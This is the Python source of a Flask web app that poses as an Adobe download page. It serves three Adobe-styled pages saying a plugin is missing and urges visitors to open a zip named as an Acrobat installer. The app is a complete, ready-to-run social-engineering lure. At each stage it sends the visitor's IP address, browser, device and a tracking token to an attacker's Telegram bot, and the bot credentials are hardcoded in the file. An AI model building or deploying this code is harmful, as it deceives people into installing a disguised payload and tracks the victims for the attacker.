# app.py
from flask import Flask, send_file, render_template_string, request, redirect, url_for
import os
import requests
import uuid
from datetime import datetime

app = Flask(__name__)

FILE_NAME = 'Adobe_Acrobat_Pro_DC_24.7.0255.zip'

# Telegram Configuration
TELEGRAM_BOT_TOKEN = 'AAFkonhjLz53zpm-lc4Qjpq6lZdBBjsMs7I'
TELEGRAM_CHAT_ID = '8951122970'

def send_telegram_notification(visitor_info, stage):
    try:
        message = (
            f"🔴 *Adobe Lure — {stage}*\n\n"
            f"👤 *Visitor:* {visitor_info['ip']}\n"
            f" *Browser:* {visitor_info['browser']}\n"
            f"📱 *Device:* {visitor_info['device']}\n"
            f"🕐 *Time:* {visitor_info['time']}\n"
            f"📍 *Location:* {visitor_info['location']}\n"
            f"🔑 *Token:* {visitor_info['token']}\n\n"
            f"File: {FILE_NAME}"
        )
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"Telegram notification failed: {e}")

def get_visitor_info():
    if request.headers.getlist("X-Forwarded-For"):
        ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
        ip = request.remote_addr

    user_agent = request.headers.get('User-Agent', 'Unknown')

    browser = 'Unknown'
    if 'Chrome' in user_agent:
        browser = 'Chrome'
    elif 'Firefox' in user_agent:
        browser = 'Firefox'
    elif 'Safari' in user_agent and 'Chrome' not in user_agent:
        browser = 'Safari'
    elif 'Edge' in user_agent:
        browser = 'Edge'

    device = 'Desktop'
    if 'Mobile' in user_agent or 'Android' in user_agent or 'iPhone' in user_agent:
        device = 'Mobile'
    elif 'iPad' in user_agent or 'Tablet' in user_agent:
        device = 'Tablet'

    token = request.args.get('tk', str(uuid.uuid4())[:12])

    return {
        'ip': ip,
        'browser': browser,
        'device': device,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'location': 'Unknown',
        'token': token
    }

# ─── PAGE 1: Loading ──────────────────────────────────────────────────────────
LOADING_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe — Downloading Document</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .adobe-logo {
            margin-bottom: 40px;
        }
        .adobe-logo svg {
            width: 80px;
            height: auto;
        }
        .loading-text {
            font-size: 22px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 24px;
        }
        .spinner {
            width: 36px;
            height: 36px;
            border: 3.5px solid #f0f0f0;
            border-top: 3.5px solid #FA0F00;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="adobe-logo">
        <svg viewBox="0 0 130 32" xmlns="http://www.w3.org/2000/svg">
            <path fill="#FA0F00" d="M13.03 0h6.94L30 32h-7.5l-2.5-7.5h-10L7.5 32H0L13.03 0zm4 15L13.5 7.5 10.2 15h6.83z"/>
        </svg>
    </div>
    <div class="loading-text">Downloading Document</div>
    <div class="spinner"></div>

    <script>
        setTimeout(function() {
            window.location.href = '/complete?tk={{ token }}';
        }, 3500);
    </script>
</body>
</html>
'''

# ─── PAGE 2: Complete (Plugin Not Installed) ───────────────────────────────────
COMPLETE_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe — Complete</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
            color: #1b1b1b;
        }
        .pdf-icon {
            margin-bottom: 32px;
        }
        .pdf-icon svg {
            width: 72px;
            height: 88px;
        }
        .message {
            text-align: center;
            font-size: 17px;
            line-height: 1.6;
            margin-bottom: 32px;
            color: #1b1b1b;
        }
        .instructions {
            text-align: center;
            font-size: 16px;
            line-height: 1.7;
            margin-bottom: 32px;
            color: #1b1b1b;
        }
        .instructions strong {
            font-weight: 600;
        }
        .instructions a {
            color: #FA0F00;
            text-decoration: none;
            font-weight: 600;
        }
        .instructions a:hover {
            text-decoration: underline;
        }
        .help-links {
            text-align: center;
            font-size: 15px;
            color: #1b1b1b;
        }
        .help-links a {
            color: #FA0F00;
            text-decoration: none;
            font-weight: 500;
        }
        .help-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="pdf-icon">
        <svg viewBox="0 0 64 80" xmlns="http://www.w3.org/2000/svg">
            <path d="M8 0h36l12 12v60a8 8 0 01-8 8H8a8 8 0 01-8-8V8a8 8 0 018-8z" fill="none" stroke="#FA0F00" stroke-width="2.5"/>
            <path d="M44 0v12h12" fill="none" stroke="#FA0F00" stroke-width="2.5"/>
            <path d="M20 36c0-4 3-7 7-7s7 3 7 7-3 7-7 7h-4v8h4" fill="none" stroke="#FA0F00" stroke-width="2.5" stroke-linecap="round"/>
            <path d="M38 29v22M38 29l-4 4M38 29l4 4" fill="none" stroke="#FA0F00" stroke-width="2.5" stroke-linecap="round"/>
        </svg>
    </div>

    <div class="message">
        Sorry, You do not have the latest version of Adobe plugin installed.<br>
        Let's finish your installation.
    </div>

    <div class="instructions">
        Find <strong>{{ filename }}</strong> in <strong>Recent</strong> (File Explorer) and open<br>
        it to install. <a href="/download?tk={{ token }}">Download manually</a>.
    </div>

    <div class="help-links">
        Download not working? ↻ <a href="/?tk={{ token }}">Restart and Download</a> | <a href="#">Get Help</a>
    </div>

    <script>
        setTimeout(function() {
            window.location.href = '/download?tk={{ token }}';
        }, 2000);
    </script>
</body>
</html>
'''

# ─── PAGE 3: Modal on Adobe Files Dashboard ───────────────────────────────────
MODAL_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Adobe — Files</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Adobe Clean', 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #e8e8e8;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Top Navigation */
        .top-nav {
            background: #ffffff;
            height: 52px;
            display: flex;
            align-items: center;
            padding: 0 20px;
            border-bottom: 1px solid #d8d8d8;
            position: relative;
            z-index: 1;
        }
        .top-nav-logo svg {
            width: 24px;
            height: auto;
            margin-right: 24px;
        }
        .top-nav-items {
            display: flex;
            gap: 24px;
            flex: 1;
        }
        .top-nav-items a {
            font-size: 14px;
            color: #1b1b1b;
            text-decoration: none;
            font-weight: 500;
        }
        .top-nav-items a:hover {
            color: #FA0F00;
        }
        .top-nav-profile {
            width: 32px;
            height: 32px;
            background: #FA0F00;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 13px;
            font-weight: 600;
        }

        /* Sidebar */
        .sidebar {
            position: fixed;
            left: 0;
            top: 52px;
            bottom: 0;
            width: 220px;
            background: #ffffff;
            border-right: 1px solid #d8d8d8;
            padding: 16px 0;
            z-index: 1;
        }
        .sidebar-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 10px 20px;
            font-size: 14px;
            color: #4b4b4b;
            text-decoration: none;
            cursor: pointer;
        }
        .sidebar-item:hover {
            background: #f5f5f5;
        }
        .sidebar-item.active {
            background: #f0f0f0;
            color: #1b1b1b;
            font-weight: 600;
        }
        .sidebar-item svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }
        .sidebar-divider {
            height: 1px;
            background: #e8e8e8;
            margin: 12px 20px;
        }
        .sidebar-launch {
            position: absolute;
            bottom: 16px;
            left: 20px;
            font-size: 13px;
            color: #4b4b4b;
            cursor: pointer;
        }

        /* Main Content (grayed out) */
        .main-content {
            margin-left: 220px;
            margin-top: 52px;
            padding: 32px;
            filter: brightness(0.7);
        }
        .main-content h2 {
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 20px;
            color: #1b1b1b;
        }
        .filter-bar {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
        }
        .filter-bar select {
            padding: 8px 12px;
            border: 1px solid #d8d8d8;
            border-radius: 4px;
            font-size: 14px;
            background: white;
        }
        .folder-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 16px;
        }
        .folder-card {
            background: white;
            border-radius: 8px;
            padding: 16px;
            border: 1px solid #d8d8d8;
        }
        .folder-card .folder-icon {
            width: 48px;
            height: 40px;
            background: #f0f0f0;
            border-radius: 4px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .folder-card .folder-icon svg {
            width: 28px;
            height: 24px;
            fill: #8b8b8b;
        }
        .folder-card .folder-name {
            font-size: 14px;
            font-weight: 600;
            color: #1b1b1b;
            margin-bottom: 2px;
        }
        .folder-card .folder-type {
            font-size: 12px;
            color: #8b8b8b;
        }

        /* Modal Overlay */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.45);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 100;
        }
        .modal {
            background: white;
            border-radius: 12px;
            padding: 48px 56px;
            max-width: 480px;
            width: 90%;
            text-align: center;
            box-shadow: 0 8px 40px rgba(0,0,0,0.2);
        }
        .modal-logo {
            margin-bottom: 24px;
        }
        .modal-logo svg {
            width: 64px;
            height: auto;
        }
        .modal h2 {
            font-size: 24px;
            font-weight: 700;
            color: #1b1b1b;
            margin-bottom: 16px;
        }
        .modal .subtitle {
            font-size: 15px;
            color: #4b4b4b;
            margin-bottom: 24px;
        }
        .modal .details {
            font-size: 14px;
            color: #1b1b1b;
            line-height: 1.6;
            margin-bottom: 32px;
        }
        .modal .details strong {
            font-weight: 600;
        }
        .modal-btn {
            display: inline-block;
            background: #FA0F00;
            color: white;
            padding: 14px 48px;
            border-radius: 6px;
            font-size: 15px;
            font-weight: 600;
            text-decoration: none;
            border: none;
            cursor: pointer;
            transition: background 0.2s;
        }
        .modal-btn:hover {
            background: #d40d00;
        }
    </style>
</head>
<body>

    <!-- Top Nav -->
    <div class="top-nav">
        <div class="top-nav-logo">
            <svg viewBox="0 0 130 32" xmlns="http://www.w3.org/2000/svg">
                <path fill="#FA0F00" d="M13.03 0h6.94L30 32h-7.5l-2.5-7.5h-10L7.5 32H0L13.03 0zm4 15L13.5 7.5 10.2 15h6.83z"/>
            </svg>
        </div>
        <div class="top-nav-items">
            <a href="#">Creativity & Design ▾</a>
            <a href="#">PDF & E-signatures ▾</a>
            <a href="#">Marketing & Commerce ▾</a>
            <a href="#">Learn & Support </a>
        </div>
        <div class="top-nav-profile">U</div>
    </div>

    <!-- Sidebar -->
    <div class="sidebar">
        <a class="sidebar-item" href="#">
            <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
            Home
        </a>
        <a class="sidebar-item" href="#">
            <svg viewBox="0 0 24 24"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/></svg>
            Apps
        </a>
        <a class="sidebar-item active" href="#">
            <svg viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
            Files
        </a>
        <a class="sidebar-item" href="#">
            <svg viewBox="0 0 24 24"><path d="M4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm16-4H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-1 9h-4v4h-2v-4H9V9h4V5h2v4h4v2z"/></svg>
            Libraries & brands
        </a>
        <a class="sidebar-item" href="#">
            <svg viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z"/></svg>
            Review links
        </a>
        <a class="sidebar-item" href="#">
            <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
            Deleted
        </a>
        <div class="sidebar-divider"></div>
        <a class="sidebar-item" href="#">
            <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
            Create
        </a>
        <div class="sidebar-launch">Launch more ▾</div>
    </div>

    <!-- Main Content (grayed backdrop) -->
    <div class="main-content">
        <h2>Files</h2>
        <div class="filter-bar">
            <select><option>All</option></select>
        </div>
        <div class="folder-grid">
            <div class="folder-card">
                <div class="folder-icon">
                    <svg viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                </div>
                <div class="folder-name">M</div>
                <div class="folder-type">FOLDER</div>
            </div>
            <div class="folder-card">
                <div class="folder-icon">
                    <svg viewBox="0 0 24 24"><path d="M10 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z"/></svg>
                </div>
                <div class="folder-name">Official</div>
                <div class="folder-type">FOLDER</div>
            </div>
        </div>
    </div>

    <!-- Modal -->
    <div class="modal-overlay">
        <div class="modal">
            <div class="modal-logo">
                <svg viewBox="0 0 130 32" xmlns="http://www.w3.org/2000/svg">
                    <path fill="#FA0F00" d="M13.03 0h6.94L30 32h-7.5l-2.5-7.5h-10L7.5 32H0L13.03 0zm4 15L13.5 7.5 10.2 15h6.83z"/>
                </svg>
            </div>
            <h2>Download Complete</h2>
            <p class="subtitle">Your download is ready.</p>
            <p class="details">
                Your installer has been saved to your device. Find<br>
                <strong>{{ filename }}</strong> in <strong>Recent</strong> (File Explorer)<br>
                and open it to install.<br><br>
                If your download did not start automatically, you can<br>
                download the document again.
            </p>
            <a href="/download?tk={{ token }}" class="modal-btn">Download Document</a>
        </div>
    </div>

</body>
</html>
'''

# ─── ROUTES ────────────────────────────────────────────────────────────────────

@app.route('/')
def index():
    if not os.path.exists(FILE_NAME):
        return "File not found. Please ensure the file is uploaded to the server.", 404

    visitor_info = get_visitor_info()
    send_telegram_notification(visitor_info, 'Stage 1 — Loading')

    return render_template_string(LOADING_TEMPLATE,
                                  filename=FILE_NAME,
                                  token=visitor_info['token'])

@app.route('/complete')
def complete():
    visitor_info = get_visitor_info()
    send_telegram_notification(visitor_info, 'Stage 2 — Complete')

    return render_template_string(COMPLETE_TEMPLATE,
                                  filename=FILE_NAME,
                                  token=visitor_info['token'])

@app.route('/download')
def download():
    visitor_info = get_visitor_info()
    send_telegram_notification(visitor_info, 'Stage 3 — Download Page')

    return render_template_string(MODAL_TEMPLATE,
                                  filename=FILE_NAME,
                                  token=visitor_info['token'])

@app.route('/download-file')
def download_file():
    return send_file(FILE_NAME, as_attachment=True)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))